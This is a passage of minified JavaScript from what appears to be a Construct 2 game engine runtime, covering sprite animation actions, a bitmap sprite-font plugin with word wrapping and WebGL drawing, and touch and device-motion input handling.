                        s = f.getCurrentSol(),
                        o = m.valuesRef();
                    if (s.select_all) {
                        for (s.select_all = !1, cr.clearArray(s.instances), e = 0, i = o.length; e < i; ++e) s.instances[e] = o[e];
                        if (r)
                            for (cr.clearArray(s.else_instances), e = 0, i = f.instances.length; e < i; ++e) n = f.instances[e], m.contains(n) || s.else_instances.push(n)
                    } else if (r) {
                        var a = s.instances.length;
                        for (e = 0, i = o.length; e < i; ++e) s.instances[a + e] = o[e], cr.arrayFindRemove(s.else_instances, o[e])
                    } else cr.shallowAssignArray(s.instances, o);
                    f.applySolToContainer()
                }
                m.clear(), g = !1
            }
        }, s.prototype.IsOverlapping = function (t) {
            return v.call(this, t, 0, 0)
        }, s.prototype.IsOverlappingOffset = function (t, e, i) {
            return v.call(this, t, e, i)
        }, s.prototype.IsAnimPlaying = function (t) {
            return this.changeAnimName.length ? cr.equals_nocase(this.changeAnimName, t) : cr.equals_nocase(this.cur_animation.name, t)
        }, s.prototype.CompareFrame = function (t, e) {
            return cr.do_cmp(this.cur_frame, t, e)
        }, s.prototype.CompareAnimSpeed = function (t, e) {
            var i = this.animForwards ? this.cur_anim_speed : -this.cur_anim_speed;
            return cr.do_cmp(i, t, e)
        }, s.prototype.OnAnimFinished = function (t) {
            return cr.equals_nocase(this.animTriggerName, t)
        }, s.prototype.OnAnyAnimFinished = function () {
            return !0
        }, s.prototype.OnFrameChanged = function () {
            return !0
        }, s.prototype.IsMirrored = function () {
            return this.width < 0
        }, s.prototype.IsFlipped = function () {
            return this.height < 0
        }, s.prototype.OnURLLoaded = function () {
            return !0
        }, s.prototype.IsCollisionEnabled = function () {
            return this.collisionsEnabled
        }, t.cnds = new s, b.prototype.Spawn = function (t, e, i) {
            if (t && e) {
                var n = this.runtime.createInstance(t, e, this.getImagePoint(i, !0), this.getImagePoint(i, !1));
                if (n) {
                    var r, s, o;
                    if (void 0 !== n.angle && (n.angle = this.angle, n.set_bbox_changed()), this.runtime.isInOnDestroy++, this.runtime.trigger(Object.getPrototypeOf(t.plugin).cnds.OnCreated, n), n.is_contained)
                        for (r = 0, s = n.siblings.length; r < s; r++) o = n.siblings[r], this.runtime.trigger(Object.getPrototypeOf(o.type.plugin).cnds.OnCreated, o);
                    this.runtime.isInOnDestroy--;
                    var a, h = this.runtime.getCurrentAction(),
                        c = !1;
                    if ((cr.is_undefined(h.extra.Spawn_LastExec) || h.extra.Spawn_LastExec < this.runtime.execcount) && (c = !0, h.extra.Spawn_LastExec = this.runtime.execcount), t != this.type && ((a = t.getCurrentSol()).select_all = !1, c ? (cr.clearArray(a.instances), a.instances[0] = n) : a.instances.push(n), n.is_contained))
                        for (r = 0, s = n.siblings.length; r < s; r++)(a = (o = n.siblings[r]).type.getCurrentSol()).select_all = !1, c ? (cr.clearArray(a.instances), a.instances[0] = o) : a.instances.push(o)
                }
            }
        }, b.prototype.SetEffect = function (t) {
            this.blend_mode = t, this.compositeOp = cr.effectToCompositeOp(t), cr.setGLBlend(this, t, this.runtime.gl), this.runtime.redraw = !0
        }, b.prototype.StopAnim = function () {
            this.animPlaying = !1
        }, b.prototype.StartAnim = function (t) {
            this.animPlaying = !0, this.frameStart = this.getNowTime(), 1 === t && 0 !== this.cur_frame && (this.changeAnimFrame = 0, this.inAnimTrigger || this.doChangeAnimFrame()), this.isTicking || (this.runtime.tickMe(this), this.isTicking = !0)
        }, b.prototype.SetAnim = function (t, e) {
            this.changeAnimName = t, this.changeAnimFrom = e, this.isTicking || (this.runtime.tickMe(this), this.isTicking = !0), this.inAnimTrigger || this.doChangeAnim()
        }, b.prototype.SetAnimFrame = function (t) {
            this.changeAnimFrame = t, this.isTicking || (this.runtime.tickMe(this), this.isTicking = !0), this.inAnimTrigger || this.doChangeAnimFrame()
        }, b.prototype.SetAnimSpeed = function (t) {
            this.cur_anim_speed = cr.abs(t), this.animForwards = t >= 0, this.isTicking || (this.runtime.tickMe(this), this.isTicking = !0)
        }, b.prototype.SetAnimRepeatToFrame = function (t) {
            (t = Math.floor(t)) < 0 && (t = 0), t >= this.cur_animation.frames.length && (t = this.cur_animation.frames.length - 1), this.cur_anim_repeatto = t
        }, b.prototype.SetMirrored = function (t) {
            var e = cr.abs(this.width) * (0 === t ? -1 : 1);
            this.width !== e && (this.width = e, this.set_bbox_changed())
        }, b.prototype.SetFlipped = function (t) {
            var e = cr.abs(this.height) * (0 === t ? -1 : 1);
            this.height !== e && (this.height = e, this.set_bbox_changed())
        }, b.prototype.SetScale = function (t) {
            var e = this.curFrame,
                i = this.width < 0 ? -1 : 1,
                n = this.height < 0 ? -1 : 1,
                r = e.width * t * i,
                s = e.height * t * n;
            this.width === r && this.height === s || (this.width = r, this.height = s, this.set_bbox_changed())
        }, b.prototype.LoadURL = function (t, e, i) {
            var n = new Image,
                r = this,
                s = this.curFrame;
            n.onload = function () {
                if (s.texture_img.src === n.src) return r.runtime.glwrap && r.curFrame === s && (r.curWebGLTexture = s.webGL_texture), 0 === e && (r.width = n.width, r.height = n.height, r.set_bbox_changed()), r.runtime.redraw = !0, void r.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnURLLoaded, r);
                s.texture_img = n, s.offx = 0, s.offy = 0, s.width = n.width, s.height = n.height, s.spritesheeted = !1, s.datauri = "", s.pixelformat = 0, r.runtime.glwrap && (s.webGL_texture && r.runtime.glwrap.deleteTexture(s.webGL_texture), s.webGL_texture = r.runtime.glwrap.loadTexture(n, !1, r.runtime.linearSampling), r.curFrame === s && (r.curWebGLTexture = s.webGL_texture), r.type.updateAllCurrentTexture()), 0 === e && (r.width = n.width, r.height = n.height, r.set_bbox_changed()), r.runtime.redraw = !0, r.runtime.trigger(cr.plugins_.Sprite.prototype.cnds.OnURLLoaded, r)
            }, "data:" !== t.substr(0, 5) && 0 === i && (n.crossOrigin = "anonymous"), this.runtime.setImageSrc(n, t)
        }, b.prototype.SetCollisions = function (t) {
            this.collisionsEnabled !== (0 !== t) && (this.collisionsEnabled = 0 !== t, this.collisionsEnabled ? this.set_bbox_changed() : (this.collcells.right >= this.collcells.left && this.type.collision_grid.update(this, this.collcells, null), this.collcells.set(0, 0, -1, -1)))
        }, t.acts = new b, w.prototype.AnimationFrame = function (t) {
            t.set_int(this.cur_frame)
        }, w.prototype.AnimationFrameCount = function (t) {
            t.set_int(this.cur_animation.frames.length)
        }, w.prototype.AnimationName = function (t) {
            t.set_string(this.cur_animation.name)
        }, w.prototype.AnimationSpeed = function (t) {
            t.set_float(this.animForwards ? this.cur_anim_speed : -this.cur_anim_speed)
        }, w.prototype.ImagePointX = function (t, e) {
            t.set_float(this.getImagePoint(e, !0))
        }, w.prototype.ImagePointY = function (t, e) {
            t.set_float(this.getImagePoint(e, !1))
        }, w.prototype.ImagePointCount = function (t) {
            t.set_int(this.curFrame.image_points.length)
        }, w.prototype.ImageWidth = function (t) {
            t.set_float(this.curFrame.width)
        }, w.prototype.ImageHeight = function (t) {
            t.set_float(this.curFrame.height)
        }, t.exps = new w
    }();
var jText = "";

function loadScript(t, e) {
    var i, n, r;
    n = !1, (i = document.createElement("script")).type = "text/javascript", i.src = t, i.onload = i.onreadystatechange = function () {
        n || this.readyState && "complete" != this.readyState || (n = !0, void 0 !== e && e())
    }, (r = document.getElementsByTagName("script")[0]).parentNode.insertBefore(i, r)
}
cr.plugins_.SpriteFontPlus = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.SpriteFontPlus.prototype;
        t.onCreate = function () {}, t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        };
        var e = t.Type.prototype;
        e.onCreate = function () {
            this.is_family || (this.texture_img = new Image, this.texture_img.idtkLoadDisposed = !0, this.texture_img.src = this.texture_file, this.runtime.wait_for_textures.push(this.texture_img), this.webGL_texture = null)
        }, e.onLostWebGLContext = function () {
            this.is_family || (this.webGL_texture = null)
        }, e.onRestoreWebGLContext = function () {
            var t, e;
            if (!this.is_family && this.instances.length)
                for (this.webGL_texture || (this.webGL_texture = this.runtime.glwrap.loadTexture(this.texture_img, !1, this.runtime.linearSampling, this.texture_pixelformat)), t = 0, e = this.instances.length; t < e; t++) this.instances[t].webGL_texture = this.webGL_texture
        }, e.unloadTextures = function () {
            this.is_family || this.instances.length || !this.webGL_texture || (this.runtime.glwrap.deleteTexture(this.webGL_texture), this.webGL_texture = null)
        }, e.preloadCanvas2D = function (t) {
            t.drawImage(this.texture_img, 0, 0)
        }, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var i = t.Instance.prototype;

        function n(t) {
            return t.replace(/\s\s*$/, "")
        }
        i.onDestroy = function () {
            var t;
            l(this.lines), t = this.clipList, o(p, t, !1),
                function (t) {
                    o(d, t, !1)
                }(this.clipUV), cr.wipe(this.characterWidthList)
        }, i.onCreate = function () {
            this.texture_img = this.type.texture_img, this.characterWidth = this.properties[0], this.characterHeight = this.properties[1], this.characterSet = this.properties[2], this.text = this.properties[3], this.characterScale = this.properties[4], this.visible = 0 === this.properties[5], this.halign = this.properties[6] / 2, this.valign = this.properties[7] / 2, this.wrapbyword = 0 === this.properties[9], this.characterSpacing = this.properties[10], this.lineHeight = this.properties[11], this.textWidth = 0, this.textHeight = 0, this.charWidthJSON = this.properties[12], this.spaceWidth = this.properties[13], jText = this.charWidthJSON, this.recycled ? (this.lines.length = 0, cr.wipe(this.clipList), cr.wipe(this.clipUV), cr.wipe(this.characterWidthList)) : (this.lines = [], this.clipList = {}, this.clipUV = {}, this.characterWidthList = {});
            try {
                if (this.charWidthJSON)
                    if (-1 !== this.charWidthJSON.indexOf('""c2array""'))
                        for (var t = (s = jQuery.parseJSON(this.charWidthJSON.replace(/""/g, '"'))).size[1], e = 0; e < t; e++)
                            for (var i = s.data[1][e][0], n = s.data[0][e][0], r = 0; r < i.length; r++) this.characterWidthList[i.charAt(r)] = n;
                    else {
                        var s;
                        for (t = (s = jQuery.parseJSON(this.charWidthJSON)).length, e = 0; e < t; e++)
                            for (i = s[e][1], n = s[e][0], r = 0; r < i.length; r++) this.characterWidthList[i.charAt(r)] = n
                    } - 1 !== this.spaceWidth && (this.characterWidthList[" "] = this.spaceWidth)
            } catch (t) {
                window.console && window.console.log && window.console.log("SpriteFont+ Failure: " + t)
            }
            this.text_changed = !0, this.lastwrapwidth = this.width, this.runtime.glwrap && (this.type.webGL_texture || (this.type.webGL_texture = this.runtime.glwrap.loadTexture(this.type.texture_img, !1, this.runtime.linearSampling, this.type.texture_pixelformat)), this.webGL_texture = this.type.webGL_texture), this.SplitSheet()
        }, i.saveToJSON = function () {
            var t = {
                t: this.text,
                csc: this.characterScale,
                csp: this.characterSpacing,
                lh: this.lineHeight,
                tw: this.textWidth,
                th: this.textHeight,
                lrt: this.last_render_tick,
                cw: {}
            };
            for (var e in this.characterWidthList) t.cw[e] = this.characterWidthList[e];
            return t
        }, i.loadFromJSON = function (t) {
            for (var e in this.text = t.t, this.characterScale = t.csc, this.characterSpacing = t.csp, this.lineHeight = t.lh, this.textWidth = t.tw, this.textHeight = t.th, this.last_render_tick = t.lrt, t.cw) this.characterWidthList[e] = t.cw[e];
            this.text_changed = !0, this.lastwrapwidth = this.width
        };

        function r(t, e) {
            return t.length ? t.pop() : new e
        }

        function s(t, e) {
            t.length < 1e3 && t.push(e)
        }

        function o(t, e, i) {
            if (i) {
                var n, r;
                for (n = 0, r = e.length; n < r; n++) s(t, e[n]);
                e.length = 0
            } else {
                var o;
                for (o in e) Object.prototype.hasOwnProperty.call(e, o) && (s(t, e[o]), delete e[o])
            }
        }

        function a(t, e, i) {
            var r, s = t.lines;
            i = n(i), e >= s.length && s.push(c()), (r = s[e]).text = i, r.width = t.measureWidth(i), t.textWidth = cr.max(t.textWidth, r.width)
        }
        var h = [];

        function c() {
            return r(h, Object)
        }

        function l(t) {
            o(h, t, !0)
        }

        function u(t, e, i, n, s, o) {
            void 0 === t[e] && (t[e] = r(p, Object)), t[e].x = i, t[e].y = n, t[e].w = s, t[e].h = o
        }
        var p = [];
        var d = [];
        i.SplitSheet = function () {
            for (var t, e, i, n, s, o, a = this.texture_img, h = a.width, c = a.height, l = this.characterWidth, p = this.characterHeight, f = l / h, m = p / c, g = this.characterSet, y = Math.floor(h / l), _ = Math.floor(c / p), v = 0; v < g.length && !(v >= y * _); v++) {
                var b = v % y,
                    w = Math.floor(v / y),
                    x = g.charAt(v);
                this.runtime.glwrap ? (t = this.clipUV, i = b * f, n = w * m, s = (b + 1) * f, o = (w + 1) * m, void 0 === t[e = x] && (t[e] = r(d, cr.rect)), t[e].left = i, t[e].top = n, t[e].right = s, t[e].bottom = o) : u(this.clipList, x, b * l, w * p, l, p)
            }
        };
        var f = [];
        t.TokeniseWords = function (t) {
            f.length = 0;
            for (var e, i = "", n = 0; n < t.length;)
                if ("\n" === (e = t.charAt(n))) i.length && (f.push(i), i = ""), f.push("\n"), ++n;
                else if (" " === e || "\t" === e || "-" === e) {
                do {
                    i += t.charAt(n), n++
                } while (n < t.length && (" " === t.charAt(n) || "\t" === t.charAt(n)));
                f.push(i), i = ""
            } else n < t.length && (i += e, n++);
            i.length && f.push(i)
        }, t.WordWrap = function (t) {
            var e = t.text,
                i = t.lines;
            if (e && e.length) {
                var n = t.width;
                if (n <= 2) l(i);
                else {
                    var r = t.characterWidth,
                        s = t.characterScale,
                        o = t.characterSpacing;
                    if (e.length * (r * s + o) - o <= n && -1 === e.indexOf("\n")) {
                        var a = t.measureWidth(e);
                        if (a <= n) return l(i), i.push(c()), i[0].text = e, i[0].width = a, t.textWidth = a, void(t.textHeight = t.characterHeight * s + t.lineHeight)
                    }
                    t.wrapbyword;
                    this.WrapText(t), t.textHeight = i.length * (t.characterHeight * s + t.lineHeight)
                }
            } else l(i)
        }, t.WrapText = function (t) {
            var e, i = t.wrapbyword,
                r = t.text,
                o = t.lines,
                c = t.width;
            i ? (this.TokeniseWords(r), e = f) : e = r;
            var l, u, p, d = "",
                m = 0,
                g = !1;
            for (u = 0; u < e.length; u++) "\n" !== e[u] ? (g = !1, l = d, d += e[u], t.measureWidth(n(d)) > c && ("" === l ? (a(t, m, d), d = "", g = !0) : (a(t, m, l), d = e[u]), m++, i || " " !== d || (d = ""))) : (!0 === g ? g = !1 : (a(t, m, d), m++), d = "");
            for (n(d).length && (a(t, m, d), m++), u = m; u < o.length; u++) p = o[u], s(h, p);
            o.length = m
        }, i.measureWidth = function (t) {
            for (var e = this.characterSpacing, i = t.length, n = 0, r = 0; r < i; r++) n += this.getCharacterWidth(t.charAt(r)) * this.characterScale + e;
            return n -= n > 0 ? e : 0
        }, i.getCharacterWidth = function (t) {
            var e = this.characterWidthList;
            return void 0 !== e[t] ? e[t] : this.characterWidth
        }, i.rebuildText = function () {
            (this.text_changed || this.width !== this.lastwrapwidth) && (this.textWidth = 0, this.textHeight = 0, this.type.plugin.WordWrap(this), this.text_changed = !1, this.lastwrapwidth = this.width)
        };
        var m = 1e-5;
        i.draw = function (t, e) {
            var i = this.texture_img;
            if ("" !== this.text && null != i) {
                if (this.rebuildText(), this.height < this.characterHeight * this.characterScale + this.lineHeight) return;
                t.globalAlpha = this.opacity;
                var n = this.x,
                    r = this.y;
                this.runtime.pixel_rounding && (n = n + .5 | 0, r = r + .5 | 0), t.save(), t.translate(n, r), t.rotate(this.angle);
                for (var s, o = this.halign, a = this.valign, h = this.characterScale, c = this.characterHeight * h, l = this.lineHeight, u = this.characterSpacing, p = this.lines, d = this.textHeight, f = a * cr.max(0, this.height - d), g = -this.hotspotX * this.width, y = -this.hotspotY * this.height, _ = y += f, v = 0; v < p.length; v++) {
                    var b = p[v].text,
                        w = p[v].width;
                    s = g + o * cr.max(0, this.width - w), _ += l;
                    for (var x = 0; x < b.length; x++) {
                        var S = b.charAt(x),
                            T = this.clipList[S];
                        if (s + this.getCharacterWidth(S) * h > this.width + m) break;
                        void 0 !== T && t.drawImage(this.texture_img, T.x, T.y, T.w, T.h, Math.round(s), Math.round(_), T.w * h, T.h * h), s += this.getCharacterWidth(S) * h + u
                    }
                    if ((_ += c) + c + l > this.height) break
                }
                t.restore()
            }
        };
        var g = new cr.quad;

        function y(t, e, i) {
            var n;
            n = t.tlx * e - t.tly * i, t.tly = t.tly * e + t.tlx * i, t.tlx = n, n = t.trx * e - t.try_ * i, t.try_ = t.try_ * e + t.trx * i, t.trx = n, n = t.blx * e - t.bly * i, t.bly = t.bly * e + t.blx * i, t.blx = n, n = t.brx * e - t.bry * i, t.bry = t.bry * e + t.brx * i, t.brx = n
        }

        function _() {}

        function v() {}

        function b() {}
        i.drawGL = function (t) {
            if (t.setTexture(this.webGL_texture), t.setOpacity(this.opacity), "" !== this.text) {
                if (this.rebuildText(), this.height < this.characterHeight * this.characterScale + this.lineHeight) return;
                this.update_bbox();
                var e = this.bquad,
                    i = 0,
                    n = 0;
                this.runtime.pixel_rounding && (i = (this.x + .5 | 0) - this.x, n = (this.y + .5 | 0) - this.y);
                var r, s, o = this.angle,
                    a = this.halign,
                    h = this.valign,
                    c = this.characterScale,
                    l = this.characterHeight * c,
                    u = this.lineHeight,
                    p = this.characterSpacing,
                    d = this.lines,
                    f = this.textHeight;
                0 !== o && (r = Math.cos(o), s = Math.sin(o));
                for (var _, v = h * cr.max(0, this.height - f), b = e.tlx + i, w = e.tly + n, x = v, S = 0; S < d.length; S++) {
                    var T = d[S].text,
                        C = d[S].width;
                    _ = a * cr.max(0, this.width - C), x += u;
                    for (var A = 0; A < T.length; A++) {
                        var O = T.charAt(A),
                            k = this.clipUV[O];
                        if (_ + this.getCharacterWidth(O) * c > this.width + m) break;
                        if (void 0 !== k) {
                            var P = this.characterWidth * c,
                                I = this.characterHeight * c;
                            g.tlx = _, g.tly = x, g.trx = _ + P, g.try_ = x, g.blx = _, g.bly = x + I, g.brx = _ + P, g.bry = x + I, 0 !== o && y(g, r, s), g.offset(b, w), t.quadTex(g.tlx, g.tly, g.trx, g.try_, g.brx, g.bry, g.blx, g.bly, k)
                        }
                        _ += this.getCharacterWidth(O) * c + p
                    }
                    if ((x += l) + l + u > this.height) break
                }
            }
        }, _.prototype.CompareText = function (t, e) {
            return e ? this.text == t : cr.equals_nocase(this.text, t)
        }, t.cnds = new _, v.prototype.SetText = function (t) {
            cr.is_number(t) && t < 1e9 && (t = Math.round(1e10 * t) / 1e10);
            var e = t.toString();
            this.text !== e && (this.text = e, this.text_changed = !0, this.runtime.redraw = !0)
        }, v.prototype.AppendText = function (t) {
            cr.is_number(t) && (t = Math.round(1e10 * t) / 1e10);
            var e = t.toString();
            e && (this.text += e, this.text_changed = !0, this.runtime.redraw = !0)
        }, v.prototype.SetScale = function (t) {
            t !== this.characterScale && (this.characterScale = t, this.text_changed = !0, this.runtime.redraw = !0)
        }, v.prototype.SetCharacterSpacing = function (t) {
            t !== this.CharacterSpacing && (this.characterSpacing = t, this.text_changed = !0, this.runtime.redraw = !0)
        }, v.prototype.SetLineHeight = function (t) {
            t !== this.lineHeight && (this.lineHeight = t, this.text_changed = !0, this.runtime.redraw = !0)
        }, i.SetCharWidth = function (t, e) {
            var i = parseInt(e, 10);
            this.characterWidthList[t] !== i && (this.characterWidthList[t] = i, this.text_changed = !0, this.runtime.redraw = !0)
        }, v.prototype.SetCharacterWidth = function (t, e) {
            if ("" !== t)
                for (var i = 0; i < t.length; i++) this.SetCharWidth(t.charAt(i), e)
        }, v.prototype.SetEffect = function (t) {
            this.compositeOp = cr.effectToCompositeOp(t), cr.setGLBlend(this, t, this.runtime.gl), this.runtime.redraw = !0
        }, t.acts = new v, b.prototype.CharacterWidth = function (t, e) {
            t.set_int(this.getCharacterWidth(e))
        }, b.prototype.CharacterHeight = function (t) {
            t.set_int(this.characterHeight)
        }, b.prototype.CharacterScale = function (t) {
            t.set_float(this.characterScale)
        }, b.prototype.CharacterSpacing = function (t) {
            t.set_int(this.characterSpacing)
        }, b.prototype.LineHeight = function (t) {
            t.set_int(this.lineHeight)
        }, b.prototype.Text = function (t) {
            t.set_string(this.text)
        }, b.prototype.TextWidth = function (t) {
            this.rebuildText(), t.set_float(this.textWidth)
        }, b.prototype.TextHeight = function (t) {
            this.rebuildText(), t.set_float(this.textHeight)
        }, t.exps = new b
    }(), cr.plugins_.Touch = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Touch.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime, this.touches = [], this.mouseDown = !1
        };
        var e = t.Instance.prototype,
            i = {
                left: 0,
                top: 0
            };
        e.findTouch = function (t) {
            var e, i;
            for (e = 0, i = this.touches.length; e < i; e++)
                if (this.touches[e].id === t) return e;
            return -1
        };
        var n = 0,
            r = 0,
            s = 0;

        function o(t) {
            n = t.x, r = t.y, s = t.z
        }
        var a = [];

        function h(t, e, i, n) {
            var r;
            return (r = a.length ? a.pop() : new l).init(t, e, i, n), r
        }

        function c(t) {
            a.length < 100 && a.push(t)
        }

        function l() {
            this.starttime = 0, this.time = 0, this.lasttime = 0, this.startx = 0, this.starty = 0, this.x = 0, this.y = 0, this.lastx = 0, this.lasty = 0, this.id = 0, this.startindex = 0, this.triggeredHold = !1, this.tooFarForHold = !1
        }
        l.prototype.init = function (t, e, i, n) {
            var r = cr.performance_now();
            this.time = r, this.lasttime = r, this.starttime = r, this.startx = t, this.starty = e, this.x = t, this.y = e, this.lastx = t, this.lasty = e, this.width = 0, this.height = 0, this.pressure = 0, this.id = i, this.startindex = n, this.triggeredHold = !1, this.tooFarForHold = !1
        }, l.prototype.update = function (t, e, i, n, r, s) {
            this.lasttime = this.time, this.time = t, this.lastx = this.x, this.lasty = this.y, this.x = e, this.y = i, this.width = n, this.height = r, this.pressure = s, !this.tooFarForHold && cr.distanceTo(this.startx, this.starty, this.x, this.y) >= 15 && (this.tooFarForHold = !0)
        }, l.prototype.maybeTriggerHold = function (t, e) {
            this.triggeredHold || cr.performance_now() - this.starttime >= 500 && !this.tooFarForHold && cr.distanceTo(this.startx, this.starty, this.x, this.y) < 15 && (this.triggeredHold = !0, t.trigger_index = this.startindex, t.trigger_id = this.id, t.getTouchIndex = e, t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnHoldGesture, t), t.curTouchX = this.x, t.curTouchY = this.y, t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnHoldGestureObject, t), t.getTouchIndex = 0)
        };
        var u = -1e3,
            p = -1e3,
            d = -1e4;
        l.prototype.maybeTriggerTap = function (t, e) {
            if (!this.triggeredHold) {
                var i = cr.performance_now();
                i - this.starttime <= 333 && !this.tooFarForHold && cr.distanceTo(this.startx, this.starty, this.x, this.y) < 15 && (t.trigger_index = this.startindex, t.trigger_id = this.id, t.getTouchIndex = e, i - d <= 666 && cr.distanceTo(u, p, this.x, this.y) < 25 ? (t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnDoubleTapGesture, t), t.curTouchX = this.x, t.curTouchY = this.y, t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnDoubleTapGestureObject, t), u = -1e3, p = -1e3, d = -1e4) : (t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTapGesture, t), t.curTouchX = this.x, t.curTouchY = this.y, t.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTapGestureObject, t), u = this.x, p = this.y, d = i), t.getTouchIndex = 0)
            }
        }, e.onCreate = function () {
            this,
            this.isWindows8 = !(void 0 === window.c2isWindows8 || !window.c2isWindows8),
            this.orient_alpha = 0,
            this.orient_beta = 0,
            this.orient_gamma = 0,
            this.acc_g_x = 0,
            this.acc_g_y = 0,
            this.acc_g_z = 0,
            this.acc_x = 0,
            this.acc_y = 0,
            this.acc_z = 0,
            this.curTouchX = 0,
            this.curTouchY = 0,
            this.trigger_index = 0,
            this.trigger_id = 0,
            this.getTouchIndex = 0,
            this.useMouseInput = 0 !== this.properties[0];
            var t = this.runtime.fullscreen_mode > 0 ? document : this.runtime.canvas,
                e = document;this.runtime.isDirectCanvas ? e = t = window.Canvas : this.runtime.isCocoonJs && (e = t = window);
            var i = this;
            if ("undefined" != typeof PointerEvent ? (t.addEventListener("pointerdown", (function (t) {
                    i.onPointerStart(t)
                }), !1), t.addEventListener("pointermove", (function (t) {
                    i.onPointerMove(t)
                }), !1), e.addEventListener("pointerup", (function (t) {
                    i.onPointerEnd(t, !1)
                }), !1), e.addEventListener("pointercancel", (function (t) {
                    i.onPointerEnd(t, !0)
                }), !1), this.runtime.canvas && (this.runtime.canvas.addEventListener("MSGestureHold", (function (t) {
                    t.preventDefault()
                }), !1), document.addEventListener("MSGestureHold", (function (t) {
                    t.preventDefault()
                }), !1), this.runtime.canvas.addEventListener("gesturehold", (function (t) {
                    t.preventDefault()
                }), !1), document.addEventListener("gesturehold", (function (t) {
                    t.preventDefault()
                }), !1))) : window.navigator.msPointerEnabled ? (t.addEventListener("MSPointerDown", (function (t) {
                    i.onPointerStart(t)
                }), !1), t.addEventListener("MSPointerMove", (function (t) {
                    i.onPointerMove(t)
                }), !1), e.addEventListener("MSPointerUp", (function (t) {
                    i.onPointerEnd(t, !1)
                }), !1), e.addEventListener("MSPointerCancel", (function (t) {
                    i.onPointerEnd(t, !0)
                }), !1), this.runtime.canvas && (this.runtime.canvas.addEventListener("MSGestureHold", (function (t) {
                    t.preventDefault()
                }), !1), document.addEventListener("MSGestureHold", (function (t) {
                    t.preventDefault()
                }), !1))) : (t.addEventListener("touchstart", (function (t) {
                    i.onTouchStart(t)
                }), !1), t.addEventListener("touchmove", (function (t) {
                    i.onTouchMove(t)
                }), !1), e.addEventListener("touchend", (function (t) {
                    i.onTouchEnd(t, !1)
                }), !1), e.addEventListener("touchcancel", (function (t) {
                    i.onTouchEnd(t, !0)
                }), !1)), this.isWindows8) {
                var n = function (t) {
                        var e = t.reading;
                        i.acc_x = e.accelerationX, i.acc_y = e.accelerationY, i.acc_z = e.accelerationZ
                    },
                    r = function (t) {
                        var e = t.reading;
                        i.orient_alpha = e.yawDegrees, i.orient_beta = e.pitchDegrees, i.orient_gamma = e.rollDegrees
                    },
                    s = Windows.Devices.Sensors.Accelerometer.getDefault();
                s && (s.reportInterval = Math.max(s.minimumReportInterval, 16), s.addEventListener("readingchanged", n));
                var a = Windows.Devices.Sensors.Inclinometer.getDefault();
                a && (a.reportInterval = Math.max(a.minimumReportInterval, 16), a.addEventListener("readingchanged", r)), document.addEventListener("visibilitychange", (function (t) {
                    document.hidden || document.msHidden ? (s && s.removeEventListener("readingchanged", n), a && a.removeEventListener("readingchanged", r)) : (s && s.addEventListener("readingchanged", n), a && a.addEventListener("readingchanged", r))
                }), !1)
            } else window.addEventListener("deviceorientation", (function (t) {
                i.orient_alpha = t.alpha || 0, i.orient_beta = t.beta || 0, i.orient_gamma = t.gamma || 0
            }), !1),
            window.addEventListener("devicemotion", (function (t) {
                t.accelerationIncludingGravity && (i.acc_g_x = t.accelerationIncludingGravity.x || 0, i.acc_g_y = t.accelerationIncludingGravity.y || 0, i.acc_g_z = t.accelerationIncludingGravity.z || 0), t.acceleration && (i.acc_x = t.acceleration.x || 0, i.acc_y = t.acceleration.y || 0, i.acc_z = t.acceleration.z || 0)
            }), !1);this.useMouseInput && !this.runtime.isDomFree && (jQuery(document).mousemove((function (t) {
                i.onMouseMove(t)
            })), jQuery(document).mousedown((function (t) {
                i.onMouseDown(t)
            })), jQuery(document).mouseup((function (t) {
                i.onMouseUp(t)
            }))),
            !this.runtime.isiOS && this.runtime.isCordova && navigator.accelerometer && navigator.accelerometer.watchAcceleration && navigator.accelerometer.watchAcceleration(o, null, {
                frequency: 40
            }),
            this.runtime.tick2Me(this)
        }, e.onPointerMove = function (t) {
            if (t.pointerType !== t.MSPOINTER_TYPE_MOUSE && "mouse" !== t.pointerType) {
                t.preventDefault && t.preventDefault();
                var e = this.findTouch(t.pointerId),
                    n = cr.performance_now();
                if (e >= 0) {
                    var r = this.runtime.isDomFree ? i : jQuery(this.runtime.canvas).offset(),
                        s = this.touches[e];
                    if (n - s.time < 2) return;
                    s.update(n, t.pageX - r.left, t.pageY - r.top, t.width || 0, t.height || 0, t.pressure || 0)
                }
            }
        }, e.onPointerStart = function (t) {
            if (t.pointerType !== t.MSPOINTER_TYPE_MOUSE && "mouse" !== t.pointerType) {
                t.preventDefault && cr.isCanvasInputEvent(t) && t.preventDefault();
                var e = this.runtime.isDomFree ? i : jQuery(this.runtime.canvas).offset(),
                    n = t.pageX - e.left,
                    r = t.pageY - e.top;
                cr.performance_now();
                this.trigger_index = this.touches.length, this.trigger_id = t.pointerId, this.touches.push(h(n, r, t.pointerId, this.trigger_index)), this.runtime.isInUserInputEvent = !0, this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchStart, this), this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchStart, this), this.curTouchX = n, this.curTouchY = r, this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchObject, this), this.runtime.isInUserInputEvent = !1
            }
        }, e.onPointerEnd = function (t, e) {
            if (t.pointerType !== t.MSPOINTER_TYPE_MOUSE && "mouse" !== t.pointerType) {
                t.preventDefault && cr.isCanvasInputEvent(t) && t.preventDefault();
                var i = this.findTouch(t.pointerId);
                this.trigger_index = i >= 0 ? this.touches[i].startindex : -1, this.trigger_id = i >= 0 ? this.touches[i].id : -1, this.runtime.isInUserInputEvent = !0, this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnNthTouchEnd, this), this.runtime.trigger(cr.plugins_.Touch.prototype.cnds.OnTouchEnd, this), i >= 0 && (e || this.touches[i].maybeTriggerTap(this, i), c(this.touches[i]), this.touches.splice(i, 1)), this.runtime.isInUserInputEvent = !1
            }
